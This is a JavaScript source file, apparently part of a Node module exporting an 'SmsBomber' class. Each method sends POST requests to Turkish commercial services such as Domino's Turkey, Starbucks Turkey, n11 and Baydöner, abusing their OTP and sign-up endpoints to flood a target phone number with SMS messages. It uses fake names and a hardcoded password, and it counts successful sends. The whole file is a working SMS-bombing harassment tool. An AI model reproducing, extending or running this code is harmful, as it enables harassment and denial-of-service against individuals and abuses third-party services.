            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> yilmazticaret.net`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> yilmazticaret.net`); this.error += 1; }
        this.mesajiEditle();
    };

    async yuffi() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.yuffi.co/api/parent/login/user";
            const json = { phone: this.phone, kvkk: true };
            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.success === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.yuffi.co`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.yuffi.co`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.yuffi.co`); this.error += 1; }
        this.mesajiEditle();
    };

    async starbucks() {
        if (this.isCancelled()) return;
        try {
            const url = "https://auth.sbuxtr.com:443/signUp";
            const json = { "email": this.mail, "firstName": "Whisky", "lastName": "Lorean", "password": "29ZEY..zey18", "phoneNumber": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.code === 50) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> auth.sbuxtr.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> auth.sbuxtr.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> auth.sbuxtr.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async pidem() {
        if (this.isCancelled()) return;
        try {
            const url = "https://restashop.azurewebsites.net:443/graphql/";
            const json = { "query": "mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus } }", "variables": { "phone": this.phone } };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.data.sendOtpSms.resultStatus === "SUCCESS") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> restashop.azurewebsites.net`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> restashop.azurewebsites.net`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> restashop.azurewebsites.net`); this.error += 1; }
        this.mesajiEditle();
    };

    async baydoner() {
        if (this.isCancelled()) return;
        try {
            const url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp";
            const json = { "Email": this.mail, "Name": "Whisky", "PhoneNumber": this.phone, "Surname": "Lorean" };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.Control === 1) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> crmmobil.baydoner.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> crmmobil.baydoner.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> crmmobil.baydoner.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async frink() {
        if (this.isCancelled()) return;
        try {
            const url = "https://api.frink.com.tr:443/api/auth/postSendOTP";
            const json = { "areaCode": "90", "phoneNumber": "90" + this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.processStatus === "SUCCESS") { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.frink.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.frink.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.frink.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async bodrum() {
        if (this.isCancelled()) return;
        try {
            const url = "https://gandalf.orwi.app:443/api/user/requestOtp";
            const json = { "gsm": "+90" + this.phone, "source": "orwi" };
            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(json) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> gandalf.orwi.app`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> gandalf.orwi.app`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> gandalf.orwi.app`); this.error += 1; }
        this.mesajiEditle();
    };

    async dominos() {
        if (this.isCancelled()) return;
        try {
            const url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode";
            const json = { "email": this.mail, "isSure": false, "mobilePhone": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(json) });
            const data = await response.json();
            if (data.isSuccess === true) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> frontend.dominos.com.tr`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> frontend.dominos.com.tr`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> frontend.dominos.com.tr`); this.error += 1; }
        this.mesajiEditle();
    };

    async hoplaGit() {
        if (this.isCancelled()) return;
        try {
            const url = 'https://api.hoplagit.com:443/v1/auth:reqSMS';
            const data1 = { phone: `+90${this.phone}` };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(data1) });
            if (response.status === 201) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> api.hoplagit.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> api.hoplagit.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> api.hoplagit.com`); this.error += 1; }
        this.mesajiEditle();
    };

    async n11() {
        if (this.isCancelled()) return;
        try {
            const url = 'https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification';
            const data1 = { "countryCode": "+90", "email": this.mail, "gsmNumber": this.phone };
            const response = await fetch(url, { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify(data1) });
            if (response.status === 200) { this.data.push(` [2;36m[+] Başarılı! ${this.phone} --> mobileapi.n11.com`); this.success += 1; }
            else { this.data.push(` [2;31m[-] Başarısız! ${this.phone} --> mobileapi.n11.com`); this.error += 1; }
        } catch (error) { this.data.push(` [2;31m[-] Hata! ${this.phone} --> mobileapi.n11.com`); this.error += 1; }
        this.mesajiEditle();
    };
};

module.exports =
{
    SmsBomber
};

// developed by youtube.com/@djsturkiye // Whisky Lorean

